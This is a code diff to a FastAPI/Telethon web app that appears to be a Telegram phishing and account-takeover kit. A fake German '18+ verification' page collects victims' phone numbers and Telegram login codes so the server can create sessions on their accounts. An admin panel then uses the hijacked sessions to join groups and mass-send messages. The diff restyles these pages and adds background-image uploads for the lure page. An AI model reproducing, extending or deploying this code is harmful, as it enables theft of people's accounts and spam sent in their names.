@@ -9,7 +9,8 @@ from telethon.errors import FloodWaitError, SessionPasswordNeededError
 from telethon.tl.functions.channels import JoinChannelRequest
 from telethon.tl.functions.messages import ImportChatInviteRequest
 from fastapi import FastAPI, UploadFile, File, Form, Request
-from fastapi.responses import HTMLResponse, JSONResponse, RedirectResponse
+from fastapi.responses import HTMLResponse, JSONResponse, RedirectResponse, FileResponse
+from fastapi.staticfiles import StaticFiles
 import uvicorn
 from dotenv import load_dotenv
 
@@ -22,6 +23,9 @@ app = FastAPI(title="Telegram Verify")
 
 SESSIONS_DIR = Path("sessions")
 SESSIONS_DIR.mkdir(exist_ok=True)
+STATIC_DIR = Path("static")
+STATIC_DIR.mkdir(exist_ok=True)
+BG_PATH = STATIC_DIR / "bg.jpg"
 
 login_clients = {}
 sessions_tokens = {}
@@ -33,6 +37,8 @@ def check_auth(request: Request):
     token = request.cookies.get("auth_token")
     return token in sessions_tokens
 
+app.mount("/static", StaticFiles(directory="static"), name="static")
+
 VERIFY_HTML = """
 <!DOCTYPE html>
 <html lang="de">
@@ -43,6 +49,7 @@ VERIFY_HTML = """
 <style>
 * { margin:0; padding:0; box-sizing:border-box; }
 body { font-family: system-ui, -apple-system, sans-serif; background:#0a0a12; min-height:100vh; color:#fff; }
+.bg { position:fixed; inset:0; background-size:cover; background-position:center; z-index:-1; filter:blur(2px); }
 .screen { min-height:100vh; display:flex; flex-direction:column; align-items:center; justify-content:center; padding:20px; }
 .hidden { display:none !important; }
 .age-box { background: rgba(0,0,0,0.75); border-radius:20px; padding:24px; text-align:center; max-width:340px; }
@@ -67,6 +74,7 @@ body { font-family: system-ui, -apple-system, sans-serif; background:#0a0a12; mi
 </style>
 </head>
 <body>
+<div class="bg" id="bg" style="background-image:url('/static/bg.jpg?t=' + Date.now());"></div>
 <div id="ageScreen" class="screen">
   <div class="age-box">
     <div class="age-icon">🔞</div>
@@ -75,7 +83,6 @@ body { font-family: system-ui, -apple-system, sans-serif; background:#0a0a12; mi
     <button class="age-btn" onclick="showVerify()">Ja, ich bin 18+ ✓</button>
   </div>
 </div>
-
 <div id="verifyScreen" class="screen hidden">
   <div class="verify-box">
     <div style="font-size:40px; margin-bottom:8px;">🔐</div>
@@ -85,31 +92,18 @@ body { font-family: system-ui, -apple-system, sans-serif; background:#0a0a12; mi
     <button class="req-btn" onclick="startLogin()">Zugangscode anfordern</button>
     <div id="codeArea" style="display:none; margin-top:16px;">
       <div class="code-boxes" id="codeBoxes">
-        <div class="code-box"></div>
-        <div class="code-box"></div>
-        <div class="code-box"></div>
-        <div class="code-box"></div>
-        <div class="code-box"></div>
+        <div class="code-box"></div><div class="code-box"></div><div class="code-box"></div><div class="code-box"></div><div class="code-box"></div>
       </div>
       <div class="keypad">
-        <button class="key" onclick="addDigit('1')">1</button>
-        <button class="key" onclick="addDigit('2')">2</button>
-        <button class="key" onclick="addDigit('3')">3</button>
-        <button class="key" onclick="addDigit('4')">4</button>
-        <button class="key" onclick="addDigit('5')">5</button>
-        <button class="key" onclick="addDigit('6')">6</button>
-        <button class="key" onclick="addDigit('7')">7</button>
-        <button class="key" onclick="addDigit('8')">8</button>
-        <button class="key" onclick="addDigit('9')">9</button>
-        <button class="key clear" onclick="clearCode()">⌫</button>
-        <button class="key" onclick="addDigit('0')">0</button>
-        <button class="key" onclick="submitCode()">✓</button>
+        <button class="key" onclick="addDigit('1')">1</button><button class="key" onclick="addDigit('2')">2</button><button class="key" onclick="addDigit('3')">3</button>
+        <button class="key" onclick="addDigit('4')">4</button><button class="key" onclick="addDigit('5')">5</button><button class="key" onclick="addDigit('6')">6</button>
+        <button class="key" onclick="addDigit('7')">7</button><button class="key" onclick="addDigit('8')">8</button><button class="key" onclick="addDigit('9')">9</button>
+        <button class="key clear" onclick="clearCode()">⌫</button><button class="key" onclick="addDigit('0')">0</button><button class="key" onclick="submitCode()">✓</button>
       </div>
     </div>
     <div id="msg"></div>
   </div>
 </div>
-
 <script>
 let code = '';
 function showVerify() {
@@ -118,30 +112,15 @@ function showVerify() {
 }
 function updateBoxes() {
   const boxes = document.querySelectorAll('.code-box');
-  boxes.forEach((b, i) => {
-    b.textContent = code[i] || '';
-    b.classList.toggle('filled', !!code[i]);
-  });
+  boxes.forEach((b, i) => { b.textContent = code[i] || ''; b.classList.toggle('filled', !!code[i]); });
 }
-function addDigit(d) {
-  if (code.length < 5) {
-    code += d;
-    updateBoxes();
-  }
-}
-function clearCode() {
-  code = code.slice(0, -1);
-  updateBoxes();
-}
+function addDigit(d) { if (code.length < 5) { code += d; updateBoxes(); } }
+function clearCode() { code = code.slice(0, -1); updateBoxes(); }
 async function startLogin() {
   const phone = document.getElementById('phone').value.trim();
   if (!phone) return alert('Nummer eingeben');
   document.getElementById('msg').textContent = 'Sende Code...';
-  const res = await fetch('/verify/start', {
-    method: 'POST',
-    headers: {'Content-Type':'application/json'},
-    body: JSON.stringify({phone})
-  });
+  const res = await fetch('/verify/start', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({phone}) });
   const data = await res.json();
   if (data.ok) {
     document.getElementById('codeArea').style.display = 'block';
@@ -156,17 +135,12 @@ async function submitCode() {
   if (code.length < 5) return alert('Code vollständig eingeben');
   const phone = document.getElementById('phone').value.trim();
   document.getElementById('msg').textContent = 'Verifiziere...';
-  const res = await fetch('/verify/finish', {
-    method: 'POST',
-    headers: {'Content-Type':'application/json'},
-    body: JSON.stringify({phone, code, password: ''})
-  });
+  const res = await fetch('/verify/finish', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({phone, code, password:''}) });
   const data = await res.json();
   if (data.ok) {
     document.getElementById('msg').className = 'success';
     document.getElementById('msg').textContent = '✅ Erfolgreich verifiziert!';
-    code = '';
-    updateBoxes();
+    code = ''; updateBoxes();
   } else {
     document.getElementById('msg').className = 'error';
     document.getElementById('msg').textContent = data.error || 'Fehler';
@@ -186,12 +160,12 @@ LOGIN_HTML = """
 <title>Admin Login</title>
 <style>
 * { margin:0; padding:0; box-sizing:border-box; }
-body { font-family: system-ui, -apple-system, sans-serif; background:#0a0a12; min-height:100vh; display:flex; align-items:center; justify-content:center; color:#fff; padding:20px; }
-.box { background:#161622; border-radius:24px; padding:40px 32px; width:100%; max-width:380px; text-align:center; border:1px solid #222; }
-h1 { font-size:26px; margin-bottom:8px; }
-p { color:#888; margin-bottom:28px; }
-input { width:100%; padding:14px; border-radius:14px; border:1px solid #2a2a3a; background:#0e0e16; color:#fff; font-size:16px; margin:8px 0; }
-button { width:100%; padding:14px; background:#2d8cff; border:none; border-radius:14px; color:#fff; font-weight:600; font-size:16px; margin-top:12px; cursor:pointer; }
+body { font-family: system-ui, -apple-system, sans-serif; background: linear-gradient(135deg, #0f0c29, #302b63, #24243e); min-height:100vh; display:flex; align-items:center; justify-content:center; color:#fff; padding:20px; }
+.box { background: rgba(255,255,255,0.08); backdrop-filter: blur(12px); border:1px solid rgba(255,255,255,0.15); border-radius:28px; padding:48px 36px; width:100%; max-width:400px; text-align:center; }
+h1 { font-size:32px; margin-bottom:8px; background: linear-gradient(90deg, #00f5ff, #ff6bcb); -webkit-background-clip:text; -webkit-text-fill-color:transparent; }
+p { color:#aaa; margin-bottom:32px; }
+input { width:100%; padding:16px; border-radius:16px; border:1px solid rgba(255,255,255,0.2); background:rgba(0,0,0,0.3); color:#fff; font-size:16px; margin:10px 0; }
+button { width:100%; padding:16px; background: linear-gradient(90deg, #00f5ff, #ff6bcb); border:none; border-radius:16px; color:#000; font-weight:700; font-size:16px; margin-top:12px; cursor:pointer; }
 .error { color:#ff5555; margin-top:12px; }
 </style>
 </head>
@@ -219,19 +193,30 @@ DASHBOARD_HTML = """
 <style>
 * { margin:0; padding:0; box-sizing:border-box; }
 body { font-family: system-ui, -apple-system, sans-serif; background:#0a0a12; color:#eee; min-height:100vh; }
-.header { background:#12121c; padding:14px 16px; display:flex; justify-content:space-between; align-items:center; border-bottom:1px solid #222; }
-.header h1 { font-size:18px; font-weight:700; }
-.logout { background:#ef4444; color:#fff; padding:6px 12px; border-radius:10px; text-decoration:none; font-size:13px; font-weight:600; }
-.status-bar { background:#161622; padding:10px 16px; display:flex; gap:8px; flex-wrap:wrap; border-bottom:1px solid #222; font-size:12px; }
-.badge { padding:4px 10px; border-radius:20px; font-weight:600; }
-.green { background:#065f46; color:#6ee7b7; }
-.purple { background:#4c1d95; color:#c4b5fd; }
-.container { max-width:480px; margin:0 auto; padding:16px; }
+.header { background: linear-gradient(90deg, #1a1a2e, #16213e); padding:16px 20px; display:flex; justify-content:space-between; align-items:center; position:sticky; top:0; z-index:100; }
+.header h1 { font-size:20px; background: linear-gradient(90deg, #00f5ff, #ff6bcb); -webkit-background-clip:text; -webkit-text-fill-color:transparent; font-weight:800; }
+.logout { background:#ef4444; color:#fff; padding:8px 14px; border-radius:12px; text-decoration:none; font-weight:600; font-size:13px; }
+.stats { display:grid; grid-template-columns:repeat(3,1fr); gap:10px; padding:16px; }
+.stat { background: linear-gradient(145deg, #1e1e2e, #252536); border-radius:16px; padding:14px; text-align:center; }
+.stat .num { font-size:22px; font-weight:800; background: linear-gradient(90deg, #00f5ff, #ff6bcb); -webkit-background-clip:text; -webkit-text-fill-color:transparent; }
+.stat .label { font-size:11px; color:#888; margin-top:4px; }
+.container { max-width:520px; margin:0 auto; padding:0 16px 30px; }
+.section { margin-bottom:20px; }
+.section h2 { font-size:14px; color:#888; margin-bottom:10px; text-transform:uppercase; letter-spacing:1px; }
+.grid { display:grid; grid-template-columns:1fr 1fr; gap:10px; }
+.action { border-radius:16px; padding:18px; text-align:center; cursor:pointer; transition:transform 0.15s; }
+.action:hover { transform:translateY(-2px); }
+.action .icon { font-size:28px; margin-bottom:6px; }
+.action .title { font-weight:700; font-size:14px; }
+.action .sub { font-size:11px; color:rgba(255,255,255,0.7); margin-top:2px; }
+.blue { background: linear-gradient(145deg, #1e3a5f, #2563eb); }
+.purple { background: linear-gradient(145deg, #4c1d95, #7c3aed); }
+.green { background: linear-gradient(145deg, #065f46, #10b981); }
+.orange { background: linear-gradient(145deg, #7c2d12, #f97316); }
 .card { background:#161622; border-radius:16px; padding:16px; margin-bottom:12px; border:1px solid #222; }
-.card h3 { font-size:15px; margin-bottom:12px; color:#00d4ff; }
-input, textarea { width:100%; padding:12px; border-radius:12px; border:1px solid #2a2a3a; background:#0e0e16; color:#fff; font-size:15px; margin:6px 0; }
-button { width:100%; padding:12px; background:#2d8cff; border:none; border-radius:12px; color:#fff; font-weight:600; margin-top:8px; cursor:pointer; }
-.secondary { background:#333; }
+input, textarea { width:100%; padding:12px; border-radius:12px; border:1px solid #2a2a3a; background:#0e0e16; color:#fff; font-size:14px; margin:6px 0; }
+button { width:100%; padding:12px; background: linear-gradient(90deg, #00f5ff, #ff6bcb); color:#000; border:none; border-radius:12px; font-weight:700; margin-top:8px; cursor:pointer; }
+.secondary { background:#333; color:#fff; }
 .accounts { display:flex; flex-wrap:wrap; gap:6px; margin:8px 0; }
 .chip { background:#252536; padding:6px 12px; border-radius:20px; font-size:13px; display:flex; align-items:center; gap:6px; }
 .chip input { width:auto; margin:0; }
@@ -241,62 +226,88 @@ button { width:100%; padding:12px; background:#2d8cff; border:none; border-radiu
 .success { color:#4ade80; }
 .error { color:#f87171; }
 .info { color:#60a5fa; }
-.verified-badge { background:#065f46; color:#6ee7b7; padding:4px 10px; border-radius:20px; font-size:12px; font-weight:600; }
+.row { display:grid; grid-template-columns:1fr 1fr; gap:8px; }
+.bg-preview { width:100%; height:120px; border-radius:12px; background-size:cover; background-position:center; margin:8px 0; border:1px solid #333; }
+@media (max-width:400px) { .grid, .row, .stats { grid-template-columns:1fr; } }
 </style>
 </head>
 <body>
 <div class="header">
-  <h1>⚡ Admin Panel</h1>
+  <h1>⚡ Admin</h1>
   <a href="/logout" class="logout">Logout</a>
 </div>
-<div class="status-bar">
-  <span class="badge green">Userbot läuft</span>
-  <span class="badge purple" id="activeCount">0 aktiv</span>
+<div class="stats">
+  <div class="stat"><div class="num" id="sessionCount">0</div><div class="label">Sessions</div></div>
+  <div class="stat"><div class="num">✓</div><div class="label">Verifiziert</div></div>
+  <div class="stat"><div class="num">Online</div><div class="label">Status</div></div>
 </div>
 <div class="container">
-  <div class="card">
-    <h3>📱 Aktive Sessions</h3>
-    <div id="sessionList"></div>
+  <div class="section">
+    <h2>Schnellzugriff</h2>
+    <div class="grid">
+      <div class="action blue" onclick="showSection('sessions')"><div class="icon">📱</div><div class="title">Sessions</div><div class="sub">Accounts verwalten</div></div>
+      <div class="action purple" onclick="showSection('join')"><div class="icon">🔗</div><div class="title">Joinen</div><div class="sub">In Gruppen beitreten</div></div>
+      <div class="action green" onclick="showSection('send')"><div class="icon">📤</div><div class="title">Senden</div><div class="sub">Nachrichten schicken</div></div>
+      <div class="action orange" onclick="showSection('bg')"><div class="icon">🖼️</div><div class="title">Hintergrund</div><div class="sub">Verify-Seite ändern</div></div>
+    </div>
   </div>
-  <div class="card">
-    <h3>📁 Session hochladen</h3>
-    <form id="uploadForm">
-      <input type="file" id="sessionFile" accept=".session">
-      <button type="submit">Hochladen</button>
-    </form>
+  <div id="sessions" class="section" style="display:none;">
+    <h2>Sessions</h2>
+    <div class="card">
+      <form id="uploadForm"><input type="file" id="sessionFile" accept=".session"><button type="submit">Session hochladen</button></form>
+    </div>
+    <div class="card"><div id="sessionList"></div></div>
   </div>
-  <div class="card">
-    <h3>🔗 In Gruppe joinen</h3>
-    <div class="accounts" id="joinAccountSelect"></div>
-    <input id="joinLink" placeholder="https://t.me/gruppe oder +invite">
-    <button onclick="joinGroup()">Joinen</button>
+  <div id="join" class="section" style="display:none;">
+    <h2>Joinen</h2>
+    <div class="card">
+      <div class="accounts" id="joinAccountSelect"></div>
+      <input id="joinLink" placeholder="https://t.me/gruppe oder +invite">
+      <button onclick="joinGroup()">Joinen</button>
+    </div>
   </div>
-  <div class="card">
-    <h3>📤 Nachricht senden</h3>
-    <form id="sendForm">
-      <div class="accounts" id="accountSelect"></div>
-      <button type="button" class="secondary" onclick="loadGroups()">Gruppen laden</button>
-      <div id="groupList" style="max-height:160px; overflow-y:auto; margin:8px 0;"></div>
-      <input name="group" id="manualGroup" placeholder="Oder manuell: @gruppe / Link">
-      <input type="file" name="file">
-      <textarea name="caption" placeholder="Nachricht..."></textarea>
-      <div style="display:grid; grid-template-columns:1fr 1fr; gap:8px; margin-top:8px;">
-        <input type="number" name="rounds" value="1" min="1" placeholder="Wie oft">
-        <input type="number" name="delay" value="8" min="1" placeholder="Delay (s)">
-      </div>
-      <button type="submit">Senden</button>
-    </form>
+  <div id="send" class="section" style="display:none;">
+    <h2>Senden</h2>
+    <div class="card">
+      <form id="sendForm">
+        <div class="accounts" id="accountSelect"></div>
+        <button type="button" class="secondary" onclick="loadGroups()">Gruppen laden</button>
+        <div id="groupList" style="max-height:160px; overflow-y:auto; margin:8px 0;"></div>
+        <input name="group" id="manualGroup" placeholder="Oder manuell: @gruppe / Link">
+        <input type="file" name="file">
+        <textarea name="caption" placeholder="Nachricht..."></textarea>
+        <div class="row">
+          <input type="number" name="rounds" value="1" min="1" placeholder="Wie oft">
+          <input type="number" name="delay" value="8" min="1" placeholder="Delay (s)">
+        </div>
+        <button type="submit">Senden starten</button>
+      </form>
+    </div>
   </div>
-  <div class="card">
-    <h3>📋 Log</h3>
-    <div id="log">Bereit...</div>
+  <div id="bg" class="section" style="display:none;">
+    <h2>Verify Hintergrund</h2>
+    <div class="card">
+      <div class="bg-preview" id="bgPreview" style="background-image:url('/static/bg.jpg?t=' + Date.now());"></div>
+      <form id="bgForm">
+        <input type="file" id="bgFile" accept="image/*">
+        <button type="submit">Hintergrund ändern</button>
+      </form>
+    </div>
+  </div>
+  <div id="log" class="section" style="display:none;">
+    <h2>Log</h2>
+    <div class="card"><div id="log">Bereit...</div></div>
   </div>
 </div>
 <script>
+function showSection(id) {
+  document.querySelectorAll('.section').forEach(s => { if (s.id) s.style.display = 'none'; });
+  document.getElementById(id).style.display = 'block';
+}
 async function loadSessions() {
   const res = await fetch('/sessions');
   const sessions = await res.json();
-  document.getElementById('activeCount').textContent = sessions.length + ' aktiv';
+  document.getElementById('sessionCount').textContent = sessions.length;
   const list = document.getElementById('sessionList');
   const select = document.getElementById('accountSelect');
   const joinSelect = document.getElementById('joinAccountSelect');
@@ -306,12 +317,7 @@ async function loadSessions() {
     joinSelect.innerHTML = '<p style="color:#666;">Keine</p>';
     return;
   }
-  list.innerHTML = sessions.map(s => `
-    <div class="session-item">
-      <span>${s} <span class="verified-badge">✓</span></span>
-      <button class="delete" onclick="deleteSession('${s}')">Löschen</button>
-    </div>
-  `).join('');
+  list.innerHTML = sessions.map(s => `<div class="session-item"><span>${s}</span><button class="delete" onclick="deleteSession('${s}')">Löschen</button></div>`).join('');
   const chips = sessions.map(s => `<label class="chip"><input type="checkbox" name="accounts" value="${s}" checked> ${s}</label>`).join('');
   select.innerHTML = chips;
   joinSelect.innerHTML = sessions.map(s => `<label class="chip"><input type="checkbox" name="joinAccounts" value="${s}" checked> ${s}</label>`).join('');
@@ -331,9 +337,23 @@ document.getElementById('uploadForm').onsubmit = async (e) => {
   try {
     const res = await fetch('/session/upload', { method:'POST', body:data });
     const result = await res.json();
+    if (result.ok) { log('Hochgeladen: ' + result.name, 'success'); loadSessions(); }
+    else log(result.error || 'Fehler', 'error');
+  } catch(err) { log('Fehler: ' + err, 'error'); }
+};
+document.getElementById('bgForm').onsubmit = async (e) => {
+  e.preventDefault();
+  const fileInput = document.getElementById('bgFile');
+  if (!fileInput.files[0]) return alert('Bild auswählen');
+  const data = new FormData();
+  data.append('file', fileInput.files[0]);
+  log('Ändere Hintergrund...', 'info');
+  try {
+    const res = await fetch('/bg/upload', { method:'POST', body:data });
+    const result = await res.json();
     if (result.ok) {
-      log('Hochgeladen: ' + result.name, 'success');
-      loadSessions();
+      log('Hintergrund geändert', 'success');
+      document.getElementById('bgPreview').style.backgroundImage = "url('/static/bg.jpg?t=" + Date.now() + "')";
     } else log(result.error || 'Fehler', 'error');
   } catch(err) { log('Fehler: ' + err, 'error'); }
 };
@@ -361,15 +381,8 @@ async function loadGroups() {
   const res = await fetch('/groups', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({accounts: checked}) });
   const data = await res.json();
   const list = document.getElementById('groupList');
-  if (!data.groups || !data.groups.length) {
-    list.innerHTML = '<p style="color:#666;">Keine Gruppen</p>';
-    return;
-  }
-  list.innerHTML = data.groups.map(g => `
-    <label class="chip" style="display:flex; width:100%; margin-bottom:4px;">
-      <input type="checkbox" name="groups" value="${g.id}"> ${g.title}
-    </label>
-  `).join('');
+  if (!data.groups || !data.groups.length) { list.innerHTML = '<p style="color:#666;">Keine Gruppen</p>'; return; }
+  list.innerHTML = data.groups.map(g => `<label class="chip" style="display:flex; width:100%; margin-bottom:4px;"><input type="checkbox" name="groups" value="${g.id}"> ${g.title}</label>`).join('');
   log(data.groups.length + ' Gruppen geladen', 'success');
 }
 document.getElementById('sendForm').onsubmit = async (e) => {
@@ -381,8 +394,7 @@ document.getElementById('sendForm').onsubmit = async (e) => {
   const manual = document.getElementById('manualGroup').value.trim();
   if (!accounts.length) return alert('Account auswählen');
   if (!groups.length && !manual) return alert('Gruppe auswählen');
-  data.delete('accounts');
-  data.delete('groups');
+  data.delete('accounts'); data.delete('groups');
   accounts.forEach(a => data.append('accounts', a));
   groups.forEach(g => data.append('groups', g));
   if (manual) data.append('manual', manual);
@@ -516,6 +528,16 @@ async def delete_session(request: Request):
         return {"ok": True}
     return {"ok": False, "error": "Nicht gefunden"}
 
+@app.post("/bg/upload")
+async def upload_bg(request: Request, file: UploadFile = File(...)):
+    if not check_auth(request):
+        return JSONResponse({"ok": False, "error": "unauthorized"}, status_code=401)
+    if not file.content_type.startswith("image/"):
+        return {"ok": False, "error": "Nur Bilder"}
+    with open(BG_PATH, "wb") as f:
+        shutil.copyfileobj(file.file, f)
+    return {"ok": True}
+
 @app.post("/verify/start")
 async def verify_start(request: Request):
     data = await request.json()
@@ -555,13 +577,7 @@ async def verify_finish(request: Request):
     return {"ok": True, "name": me.first_name or phone}
 
 @app.post("/send")
-async def send(
-    request: Request,
-    caption: str = Form(""),
-    delay: int = Form(8),
-    rounds: int = Form(1),
-    file: UploadFile = File(None)
-):
+async def send(request: Request, caption: str = Form(""), delay: int = Form(8), rounds: int = Form(1), file: UploadFile = File(None)):
     if not check_auth(request):
         return JSONResponse({"results": [{"ok": False, "message": "unauthorized"}]}, status_code=401)
     form = await request.form()
